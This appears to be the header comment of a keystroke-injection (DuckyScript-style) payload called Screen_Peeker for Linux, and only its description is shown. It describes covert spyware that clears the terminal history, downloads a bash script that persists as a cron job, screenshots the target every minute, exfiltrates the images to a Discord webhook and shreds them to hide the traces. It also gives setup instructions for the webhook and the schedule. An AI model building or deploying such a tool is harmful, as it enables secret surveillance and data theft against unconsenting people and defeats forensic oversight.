REM TARGET OS: Linux (tested on Kali Linux)
REM DESCRIPTION: Screen_Peeker will unset the terminal history, download a bash script (.sp.sh) that will embed itself as a cronjob, take a screenshot of target system, exfiltrate the screenshot via Discord webhook, and then shred the file to obfuscate. Place Discord webhook in line 6 | The frequency of when the script is ran can be changed in line 19 via the (* * * * *) field. By default it will take a screenshot and exfiltrate it every minute.
